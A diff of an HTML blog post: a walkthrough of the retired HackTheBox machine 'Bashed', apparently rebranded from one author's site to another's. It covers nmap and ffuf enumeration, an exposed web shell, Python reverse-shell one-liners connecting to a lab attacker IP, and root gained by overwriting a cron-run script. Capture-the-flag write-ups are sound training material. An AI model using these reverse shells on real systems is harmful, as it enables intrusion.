@@ -1,263 +1,169 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    
-      <title>
-        Boom Bashed 🧨💥 ::
-        bhavsec — portfolio &amp; blog
-      </title>
-    
-    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta
-  name="description"
-  content="Bashed is a retired HackTheBox machine, rated easy and rightfully. We&amp;rsquo;ll start by finding a hidden web shell to quickly gaining root level access due to misconfigured permissions to users.
-Reconnaissance nmap scan Starting the reconnaissance with an initial Nmap scan.
-nmap -sC -sV -oA nmap/bashed 10.129.183.146 -sC: run default nmap scripts
--sV: detect service version
--oA: output all formats and store in file nmap/bashed
-Nmap scan report for 10.129.183.146 Host is up (0."
-/>
-<meta
-  name="keywords"
-  content="bhavsec, cybersecurity, penetration testing"
-/>
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="https://bhavsec.com/posts/boom-bashed/" />
 
-
-
-
-
-<link rel="stylesheet" href="../../assets/style.css" />
-
-<link rel="stylesheet" href="../../style.css" />
-
-
-<link
-  rel="apple-touch-icon-precomposed"
-  sizes="144x144"
-  href="../../img/apple-touch-icon-144-precomposed.png"
-/>
-<link rel="shortcut icon" href="../../img/favicon.png" />
-
-
-<link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-
-
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://bhavsec.com/img/cover.png"/>
-
-<meta name="twitter:title" content="Boom Bashed 🧨💥"/>
-<meta name="twitter:description" content="Bashed is a retired HackTheBox machine, rated easy and rightfully. We&rsquo;ll start by finding a hidden web shell to quickly gaining root level access due to misconfigured permissions to users.
-Reconnaissance nmap scan Starting the reconnaissance with an initial Nmap scan.
-nmap -sC -sV -oA nmap/bashed 10.129.183.146 -sC: run default nmap scripts
--sV: detect service version
--oA: output all formats and store in file nmap/bashed
-Nmap scan report for 10.129.183.146 Host is up (0."/>
-
-
-
-<meta property="og:title" content="Boom Bashed 🧨💥" />
-<meta property="og:description" content="Bashed is a retired HackTheBox machine, rated easy and rightfully. We&rsquo;ll start by finding a hidden web shell to quickly gaining root level access due to misconfigured permissions to users.
+<head>
+  <title>Boom Bashed 🧨💥 — Waseem Akram</title>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Bashed is a retired HackTheBox machine, rated easy and rightfully. We&amp;rsquo;ll start by finding a hidden web shell to quickly gaining root level access due to misconfigured permissions to users.
 Reconnaissance nmap scan Starting the reconnaissance with an initial Nmap scan.
 nmap -sC -sV -oA nmap/bashed 10.129.183.146 -sC: run default nmap scripts
 -sV: detect service version
 -oA: output all formats and store in file nmap/bashed
 Nmap scan report for 10.129.183.146 Host is up (0." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://bhavsec.com/posts/boom-bashed/" /><meta property="og:image" content="https://bhavsec.com/img/cover.png"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-07-16T00:00:00&#43;00:00" />
-<meta property="article:modified_time" content="2021-07-16T00:00:00&#43;00:00" /><meta property="og:site_name" content="bhavsec" />
+  <meta name="keywords" content="hackerwasii, cybersecurity, penetration testing" />
+  <meta name="robots" content="noodp" />
+  <link rel="canonical" href="https://www.hackerwasii.com/posts/boom-bashed/" />
+  <link rel="stylesheet" href="../../assets/style.css" />
+  <link rel="stylesheet" href="../../style.css" />
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../../img/apple-touch-icon-144-precomposed.png" />
+  <link rel="shortcut icon" href="../../img/favicon.png" />
+  <link href="../../assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+  <link href="../../assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+  <link href="../../assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+  <link href="../../assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+  <link href="../../assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+  <link href="../../assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
 
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://www.hackerwasii.com/img/cover.png" />
+  <meta name="twitter:title" content="Boom Bashed 🧨💥" />
+  <meta name="twitter:description" content="Bashed is a retired HackTheBox machine, rated easy and rightfully. We&rsquo;ll start by finding a hidden web shell to quickly gaining root level access due to misconfigured permissions to users.
+Reconnaissance nmap scan Starting the reconnaissance with an initial Nmap scan.
+nmap -sC -sV -oA nmap/bashed 10.129.183.146 -sC: run default nmap scripts
+-sV: detect service version
+-oA: output all formats and store in file nmap/bashed
+Nmap scan report for 10.129.183.146 Host is up (0." />
+  <meta property="og:title" content="Boom Bashed 🧨💥" />
+  <meta property="og:description" content="Bashed is a retired HackTheBox machine, rated easy and rightfully. We&rsquo;ll start by finding a hidden web shell to quickly gaining root level access due to misconfigured permissions to users.
+Reconnaissance nmap scan Starting the reconnaissance with an initial Nmap scan.
+nmap -sC -sV -oA nmap/bashed 10.129.183.146 -sC: run default nmap scripts
+-sV: detect service version
+-oA: output all formats and store in file nmap/bashed
+Nmap scan report for 10.129.183.146 Host is up (0." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://www.hackerwasii.com/posts/boom-bashed/" />
+  <meta property="og:image" content="https://www.hackerwasii.com/img/cover.png" />
+  <meta property="article:section" content="posts" />
+  <meta property="article:published_time" content="2021-07-16T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2021-07-16T00:00:00&#43;00:00" />
+  <meta property="og:site_name" content="hackerwasii" />
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0PCVFG8BNK"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
 
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
 
+    gtag('config', 'G-0PCVFG8BNK');
+  </script>
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9670252621494000"
+    crossorigin="anonymous"></script>
+</head>
 
-
-
-
-  </head>
-  <body class="">
-    <div class="container">
-      <header class="header">
-  <span class="header__inner">
-    <a
-  href="http://bhavsec.com/"
-  class="logo"
-  style="text-decoration: none;"
->
-  
-    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
-  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
-</svg>
-</span>
-    <span class="logo__text">
-      bhavsec/</span>
-    <span class="logo__text" style="color:red">posts/</span>
-    <span class="logo__cursor"></span>
-
-  
-</a>
-
-    <span class="header__right">
-      
-        <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-        
-          <li><a href="../../resume">📄 resume</a></li>
-        
-      
-        
-          <li><a href="../../posts">📚 blog</a></li>
-        
-      
-        
-          <li><a href="../../whoami">🔎 whoami </a></li>
-        
-      
-        
-          <li><a href="../../resources">🚀 resources</a></li>
-        
-      
-      
-      
-  </ul>
-
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="../../resume">📄 resume</a></li>
-      
-    
-      
-        <li><a href="../../posts">📚 blog</a></li>
-      
-    
-      
-        <li><a href="../../whoami">🔎 whoami </a></li>
-      
-    
-      
-        <li><a href="../../resources">🚀 resources</a></li>
-      
-    
-  </ul>
-</nav>
-
-        <span class="menu-trigger">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-            <path d="M0 0h24v24H0z" fill="none" />
-            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
-          </svg>
-        </span>
-      
-      <span class="theme-toggle">
-        <svg
-  class="theme-toggler"
-  width="24"
-  height="24"
-  viewBox="0 0 48 48"
-  fill="none"
-  xmlns="http://www.w3.org/2000/svg"
->
-  <path
-    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+<body class="">
+  <div class="container">
+    <header class="header">
+      <span class="header__inner">
+        <a href="https://www.hackerwasii.com/" class="logo" style="text-decoration: none;">
+          <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+              <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+            </svg>
+          </span>
+          <span class="logo__text">
+            wasii/</span>
+          <span class="logo__text" style="color:red">posts/</span>
+          <span class="logo__cursor"></span>
+        </a>
+        <span class="header__right">
+          <nav class="menu">
+            <ul class="menu__inner menu__inner--desktop">
+              <li><a href="../../resume">📄 resume</a></li>
+              <li><a href="../../posts">📚 blog</a></li>
+              <li><a href="../../whoami">🔎 whoami </a></li>
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+            <ul class="menu__inner menu__inner--mobile">
+              <li><a href="../../resume">📄 resume</a></li>
+              <li><a href="../../posts">📚 blog</a></li>
+              <li><a href="../../whoami">🔎 whoami </a></li>
+              <li><a href="../../resources">🚀 resources</a></li>
+            </ul>
+          </nav>
+          <span class="menu-trigger">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+              <path d="M0 0h24v24H0z" fill="none" />
+              <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+            </svg>
+          </span>
+          <span class="theme-toggle">
+            <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"
+              xmlns="http://www.w3.org/2000/svg">
+              <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
-  />
-</svg>
-
-      </span>
-    </span>
-  </span>
-</header>
-
-
-      <div class="content">
-        
-  
-  
-
-  <div class="post">
-    <h1 class="post-title">Boom Bashed 🧨💥</h1>
-    <div class="post-meta">
-      
-        <span class="post-date">
-          2021-07-16
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z" />
+            </svg>
+          </span>
         </span>
-
-        
-          
-        
-      
-
-      
-
-
-      
-    </div>
-
-    
-      <span class="post-tags">
-        
-          <a href="../../tags/bash/index.html">#bash</a>&nbsp;
-        
-          <a href="../../tags/htb/index.html">#htb</a>&nbsp;
-        
-          <a href="../../tags/linux/index.html">#linux</a>&nbsp;
-        
-          <a href="../../tags/python/index.html">#python</a>&nbsp;
-        
       </span>
-    
+    </header>
+    <div class="content">
+      <div class="post">
+        <h1 class="post-title">Boom Bashed 🧨💥</h1>
+        <div class="post-meta">
+          <span class="post-date">
+            2021-07-16
+          </span>
+        </div>
+        <span class="post-tags">
+          <a href="../../tags/bash/index.html">#bash</a>&nbsp;
+          <a href="../../tags/htb/index.html">#htb</a>&nbsp;
+          <a href="../../tags/linux/index.html">#linux</a>&nbsp;
+          <a href="../../tags/python/index.html">#python</a>&nbsp;
+        </span>
+        <div class="post-content">
+          <h2>Table of Contents</h2>
+          <aside class="table-of-contents">
+            <nav id="TableOfContents">
+              <ul>
+                <li><a href="index.html#reconnaissance">Reconnaissance</a>
+                  <ul>
+                    <li><a href="index.html#nmap-scan">nmap scan</a></li>
+                  </ul>
+                </li>
+                <li><a href="index.html#enumeration">Enumeration</a>
+                  <ul>
+                    <li><a href="index.html#webapp-running-on-port-80">webapp running on port 80</a></li>
+                    <li><a href="index.html#ffuf-scan">ffuf scan</a></li>
+                  </ul>
+                </li>
+                <li><a href="index.html#gaining-a-foothold">Gaining a Foothold</a>
+                  <ul>
+                    <li><a href="index.html#phpbash-shell-exposed">phpbash shell exposed</a></li>
+                    <li><a href="index.html#we-got-the-low-privileged-shell">We got the low privileged shell</a></li>
+                  </ul>
+                </li>
+                <li><a href="index.html#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="index.html#lessons-i-learned">Lessons I Learned:</a></li>
+              </ul>
+            </nav>
+          </aside>
 
-    
 
-    <div class="post-content">
-      
-        
-        <h2>Table of Contents</h2>
-        <aside class="table-of-contents"><nav id="TableOfContents">
-  <ul>
-    <li><a href="index.html#reconnaissance">Reconnaissance</a>
-      <ul>
-        <li><a href="index.html#nmap-scan">nmap scan</a></li>
-      </ul>
-    </li>
-    <li><a href="index.html#enumeration">Enumeration</a>
-      <ul>
-        <li><a href="index.html#webapp-running-on-port-80">webapp running on port 80</a></li>
-        <li><a href="index.html#ffuf-scan">ffuf scan</a></li>
-      </ul>
-    </li>
-    <li><a href="index.html#gaining-a-foothold">Gaining a Foothold</a>
-      <ul>
-        <li><a href="index.html#phpbash-shell-exposed">phpbash shell exposed</a></li>
-        <li><a href="index.html#we-got-the-low-privileged-shell">We got the low privileged shell</a></li>
-      </ul>
-    </li>
-    <li><a href="index.html#privilege-escalation">Privilege Escalation</a></li>
-    <li><a href="index.html#lessons-i-learned">Lessons I Learned:</a></li>
-  </ul>
-</nav></aside>
-        
-      
-      <p>Bashed is a retired HackTheBox machine, rated easy and rightfully. We&rsquo;ll start by finding a hidden web shell to quickly gaining root level access due to misconfigured permissions to users.</p>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap-scan">nmap scan</h3>
-<p>Starting the reconnaissance with an initial Nmap scan.</p>
-<pre><code>nmap -sC -sV -oA nmap/bashed 10.129.183.146
-</code></pre><p>-sC: run default nmap scripts</p>
-<p>-sV: detect service version</p>
-<p>-oA: output all formats and store in file <code>nmap/bashed</code></p>
-<pre><code>Nmap scan report for 10.129.183.146
+          <p>Bashed is a retired HackTheBox machine, rated easy and rightfully. We&rsquo;ll start by finding a hidden
+            web shell to quickly gaining root level access due to misconfigured permissions to users.</p>
+          <h2 id="reconnaissance">Reconnaissance</h2>
+          <h3 id="nmap-scan">nmap scan</h3>
+          <p>Starting the reconnaissance with an initial Nmap scan.</p>
+          <pre><code>nmap -sC -sV -oA nmap/bashed 10.129.183.146
+</code></pre>
+          <p>-sC: run default nmap scripts</p>
+          <p>-sV: detect service version</p>
+          <p>-oA: output all formats and store in file <code>nmap/bashed</code></p>
+          <pre><code>Nmap scan report for 10.129.183.146
 Host is up (0.037s latency).
 Not shown: 999 closed ports
 PORT   STATE SERVICE VERSION
@@ -267,27 +173,32 @@ PORT   STATE SERVICE VERSION
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Jul 14 20:59:03 2021 -- 1 IP address (1 host up) scanned in 8.09 seconds
-</code></pre><p>We get the following result showing that port 80 is open with Apache HTTP Server running on it.</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="webapp-running-on-port-80">webapp running on port 80</h3>
-<p>Looks like the developer Arrexel, has created a PHP web shell for their own pentesting purposes, and states that it was “developed on this exact server!” This indicates that there’s a high possibility that this web shell is present somewhere on the server. Interesting! If we find the <code>phpbash.php</code> file, we can potentially get a web shell!</p>
-<blockquote>
-<p>Fun fact: Arrexel is the creator of this machine.</p>
-</blockquote>
-<p><img src="../../img/posts/boom-bashed/1.png" alt="image"></p>
-<h3 id="ffuf-scan">ffuf scan</h3>
-<p>Let’s do more enumeration on the web server and find what&rsquo;s inside the website.</p>
-<pre><code>ffuf -c -r -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.183.146/FUZZ/ 
-</code></pre><p>The flags breakdown as follows:</p>
-<ul>
-<li>-c : add color to output</li>
-<li>-r : follow redirects</li>
-<li>-t : timeout in seconds</li>
-<li>-w : path to wordlist</li>
-<li>-u : URL of website</li>
-<li>FUZZ : Parameter for fuzzing in exact location</li>
-</ul>
-<pre><code>________________________________________________
+</code></pre>
+          <p>We get the following result showing that port 80 is open with Apache HTTP Server running on it.</p>
+          <h2 id="enumeration">Enumeration</h2>
+          <h3 id="webapp-running-on-port-80">webapp running on port 80</h3>
+          <p>Looks like the developer Arrexel, has created a PHP web shell for their own pentesting purposes, and states
+            that it was “developed on this exact server!” This indicates that there’s a high possibility that this web
+            shell is present somewhere on the server. Interesting! If we find the <code>phpbash.php</code> file, we can
+            potentially get a web shell!</p>
+          <blockquote>
+            <p>Fun fact: Arrexel is the creator of this machine.</p>
+          </blockquote>
+          <p><img src="../../img/posts/boom-bashed/1.png" alt="image"></p>
+          <h3 id="ffuf-scan">ffuf scan</h3>
+          <p>Let’s do more enumeration on the web server and find what&rsquo;s inside the website.</p>
+          <pre><code>ffuf -c -r -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.183.146/FUZZ/ 
+</code></pre>
+          <p>The flags breakdown as follows:</p>
+          <ul>
+            <li>-c : add color to output</li>
+            <li>-r : follow redirects</li>
+            <li>-t : timeout in seconds</li>
+            <li>-w : path to wordlist</li>
+            <li>-u : URL of website</li>
+            <li>FUZZ : Parameter for fuzzing in exact location</li>
+          </ul>
+          <pre><code>________________________________________________
 
  :: Method           : GET
  :: URL              : http://10.129.183.146/FUZZ/
@@ -309,33 +220,48 @@ fonts                   [Status: 200, Size: 2098, Words: 124, Lines: 22]
 uploads                 [Status: 200, Size: 14, Words: 1, Lines: 2]
                         [Status: 200, Size: 7743, Words: 2956, Lines: 162]
 [WARN] Caught keyboard interrupt (Ctrl-C)
-</code></pre><h2 id="gaining-a-foothold">Gaining a Foothold</h2>
-<h3 id="phpbash-shell-exposed">phpbash shell exposed</h3>
-<p>after checking all the directories with <code>200 status code</code>, found something interesting in /dev directory.</p>
-<p><img src="../../img/posts/boom-bashed/2.png" alt="image"></p>
-<p>We’re running in the context of an Apache default user <em>www-data</em>. For this machine, we already have a low privileged shell that allows us to run linux commands on the web server, so we don’t necessarily need to get our own reverse shell.</p>
-<p>However, in a real penetration test, you would place your own shell in the system just in case the creator notices his insecure configuration and takes down the php script. This way you’ll have consistent access to the system by a shell that you control.</p>
-<p>The <a href="http://pentestmonkey.net/">Pentestmonkey</a> website has a list of reverse shells. Let&rsquo;s Check if python exists on the target machine.</p>
-<pre><code>which python
-</code></pre><p>Since python is installed on the machine! Copy the python command from the list and change it to your attack machine’s ip address and listening port.</p>
-<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.172&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
-</code></pre><p>In the attack machine (kali) set up a listener.</p>
-<pre><code>nc -nlvp 1234
-</code></pre><h3 id="we-got-the-low-privileged-shell">We got the low privileged shell</h3>
-<p>we can find the user flag in <code>/home/arrexel</code> directory.</p>
-<p><img src="../../img/posts/boom-bashed/3.png" alt="image"></p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>Next, I need to figure out what other privileges I have or can easily get. The following command lists the allowed commands for my user.</p>
-<pre><code>$ sudo -l
+</code></pre>
+          <h2 id="gaining-a-foothold">Gaining a Foothold</h2>
+          <h3 id="phpbash-shell-exposed">phpbash shell exposed</h3>
+          <p>after checking all the directories with <code>200 status code</code>, found something interesting in /dev
+            directory.</p>
+          <p><img src="../../img/posts/boom-bashed/2.png" alt="image"></p>
+          <p>We’re running in the context of an Apache default user <em>www-data</em>. For this machine, we already have
+            a low privileged shell that allows us to run linux commands on the web server, so we don’t necessarily need
+            to get our own reverse shell.</p>
+          <p>However, in a real penetration test, you would place your own shell in the system just in case the creator
+            notices his insecure configuration and takes down the php script. This way you’ll have consistent access to
+            the system by a shell that you control.</p>
+          <p>The <a href="http://pentestmonkey.net/">Pentestmonkey</a> website has a list of reverse shells. Let&rsquo;s
+            Check if python exists on the target machine.</p>
+          <pre><code>which python
+</code></pre>
+          <p>Since python is installed on the machine! Copy the python command from the list and change it to your
+            attack machine’s ip address and listening port.</p>
+          <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.172&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+          <p>In the attack machine (kali) set up a listener.</p>
+          <pre><code>nc -nlvp 1234
+</code></pre>
+          <h3 id="we-got-the-low-privileged-shell">We got the low privileged shell</h3>
+          <p>we can find the user flag in <code>/home/arrexel</code> directory.</p>
+          <p><img src="../../img/posts/boom-bashed/3.png" alt="image"></p>
+          <h2 id="privilege-escalation">Privilege Escalation</h2>
+          <p>Next, I need to figure out what other privileges I have or can easily get. The following command lists the
+            allowed commands for my user.</p>
+          <pre><code>$ sudo -l
 Matching Defaults entries for www-data on bashed:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
-</code></pre><p>The last two lines are particularly interesting because it says that the user I’m running in the context of (www-data) can run as the user scriptmanager without having to provide the user’s password. This might come in handy later on.</p>
-<p>Let’s do some more enumeration.</p>
-<pre><code>$ ls -la 
+</code></pre>
+          <p>The last two lines are particularly interesting because it says that the user I’m running in the context of
+            (www-data) can run as the user scriptmanager without having to provide the user’s password. This might come
+            in handy later on.</p>
+          <p>Let’s do some more enumeration.</p>
+          <pre><code>$ ls -la 
 total 88
 drwxr-xr-x  23 root          root           4096 Dec  4  2017 .
 drwxr-xr-x  23 root          root           4096 Dec  4  2017 ..
@@ -362,23 +288,33 @@ drwxrwxrwt  10 root          root           4096 Jul 14 18:21 tmp
 drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
 drwxr-xr-x  12 root          root           4096 Dec  4  2017 var
 lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -&gt; boot/vmlinuz-4.4.0-62-generic
-</code></pre><p>Everything in the root directory seems to be owned by root except for the <strong>scripts directory</strong> which is owned by scriptmanager. In the previous step we found out that we can run as scriptmanager without a password.</p>
-<pre><code>drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4  2017 scripts
-</code></pre><p>Let&rsquo;s change the user to scriptmanager.</p>
-<pre><code>sudo -i -u scriptmanager
-</code></pre><p>Also setup Interactive Shell for better interaction.</p>
-<pre><code>export TERM=xterm-256color
+</code></pre>
+          <p>Everything in the root directory seems to be owned by root except for the <strong>scripts
+              directory</strong> which is owned by scriptmanager. In the previous step we found out that we can run as
+            scriptmanager without a password.</p>
+          <pre><code>drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4  2017 scripts
+</code></pre>
+          <p>Let&rsquo;s change the user to scriptmanager.</p>
+          <pre><code>sudo -i -u scriptmanager
+</code></pre>
+          <p>Also setup Interactive Shell for better interaction.</p>
+          <pre><code>export TERM=xterm-256color
 python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
-</code></pre><p><img src="../../img/posts/boom-bashed/4.png" alt="image"></p>
-<p>Now that we’re running as the scriptmanager, we have read/write/execute privileges in the <strong>scripts</strong> directory.</p>
-<pre><code>scriptmanager@bashed:/scripts$ ls -la
+</code></pre>
+          <p><img src="../../img/posts/boom-bashed/4.png" alt="image"></p>
+          <p>Now that we’re running as the scriptmanager, we have read/write/execute privileges in the
+            <strong>scripts</strong> directory.</p>
+          <pre><code>scriptmanager@bashed:/scripts$ ls -la
 total 16
 drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
 drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
 -rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
 -rw-r--r--  1 root          root            12 Jul 14 18:35 test.txt
-</code></pre><p>Most interesting is that the <code>test.txt</code> file is owned by root, and seems to be the result of the <code>test.py</code> script, which is writable by scriptmanager. First, I tried moving test.txt to test.txt.old. A few minutes later, it’s back:</p>
-<pre><code>scriptmanager@bashed:/scripts$ date
+</code></pre>
+          <p>Most interesting is that the <code>test.txt</code> file is owned by root, and seems to be the result of the
+            <code>test.py</code> script, which is writable by scriptmanager. First, I tried moving test.txt to
+            test.txt.old. A few minutes later, it’s back:</p>
+          <pre><code>scriptmanager@bashed:/scripts$ date
 Wed Jul  14 21:57:03 EST 2021
 
 scriptmanager@bashed:/scripts$ ls
@@ -389,115 +325,92 @@ Wed Jul  14 21:59:03 EST 2021
 
 scriptmanager@bashed:/scripts$ ls
 test.py  test.txt  test.txt.old  test2.py  test3.py
-</code></pre><p>Something is running that <code>test.py</code> script from the /scripts directory creates a test script that writes to a different file, and it writes the different file. So any .py file seems to be run. Also, since test.py doesn’t have a #! at the start, it seems that whatever is running this (maybe a cron?) is calling python.</p>
-<p>It is possible to just write a script that reads <code>/root/root.txt</code> and writes it elsewhere, but it’s better to get a shell!</p>
-<p>Let&rsquo;s create the exploit:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">echo <span style="color:#e6db74">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">10.10.14.172</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">-i</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]);&#34;</span> <span style="color:#f92672">&gt;</span> test<span style="color:#f92672">.</span>py
-</code></pre></div><p>On Kali, set up a listener, and get root shell:</p>
-<p><img src="../../img/posts/boom-bashed/5.png" alt="image"></p>
-<h2 id="lessons-i-learned">Lessons I Learned:</h2>
-<ul>
-<li>The developer should never put a webshell on the website. No matter if its hidden inside the directories. Tools like ffuf can find it in seconds. Developer must use SSH protocol instead to make a communication with webserver.</li>
-<li>Misconfigured permissions can cause destructions, Make sure web daemon user (www-data) should not be allowed for more privileges than it requires.</li>
-<li>I was little stucked in Privilege Escalation part, next time i&rsquo;ll make sure to read the permissions properly by using command <code>ls -la</code> instead of simple <code>ls</code> command. I was also having difficulty to know whether the python script is run by a cron job.</li>
-</ul>
-<p> </p>
-<p>Thanks for reading this post, if you like my work you can support by <a href="https://www.buymeacoffee.com/bhavsec">buying me a coffee</a>. ☕️</p>
-
-    </div>
-    
-      
+</code></pre>
+          <p>Something is running that <code>test.py</code> script from the /scripts directory creates a test script
+            that writes to a different file, and it writes the different file. So any .py file seems to be run. Also,
+            since test.py doesn’t have a #! at the start, it seems that whatever is running this (maybe a cron?) is
+            calling python.</p>
+          <p>It is possible to just write a script that reads <code>/root/root.txt</code> and writes it elsewhere, but
+            it’s better to get a shell!</p>
+          <p>Let&rsquo;s create the exploit:</p>
+          <div class="highlight">
+            <pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">echo <span style="color:#e6db74">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">10.10.14.172</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">-i</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]);&#34;</span> <span style="color:#f92672">&gt;</span> test<span style="color:#f92672">.</span>py
+</code></pre>
+          </div>
+          <p>On Kali, set up a listener, and get root shell:</p>
+          <p><img src="../../img/posts/boom-bashed/5.png" alt="image"></p>
+          <h2 id="lessons-i-learned">Lessons I Learned:</h2>
+          <ul>
+            <li>The developer should never put a webshell on the website. No matter if its hidden inside the
+              directories. Tools like ffuf can find it in seconds. Developer must use SSH protocol instead to make a
+              communication with webserver.</li>
+            <li>Misconfigured permissions can cause destructions, Make sure web daemon user (www-data) should not be
+              allowed for more privileges than it requires.</li>
+            <li>I was little stucked in Privilege Escalation part, next time i&rsquo;ll make sure to read the
+              permissions properly by using command <code>ls -la</code> instead of simple <code>ls</code> command. I was
+              also having difficulty to know whether the python script is run by a cron job.</li>
+          </ul>
+          <p> </p>
+          <p>Thanks for reading this post, if you like my work you can support by <a
+              href="https://www.buymeacoffee.com/hackerwasii">buying me a coffee</a>. ☕️</p>
+        </div>
         <div class="pagination">
           <div class="pagination__title">
-            <span class="pagination__title-h"
-              >Read other posts</span
-            >
+            <span class="pagination__title-h">Read other posts</span>
             <hr />
           </div>
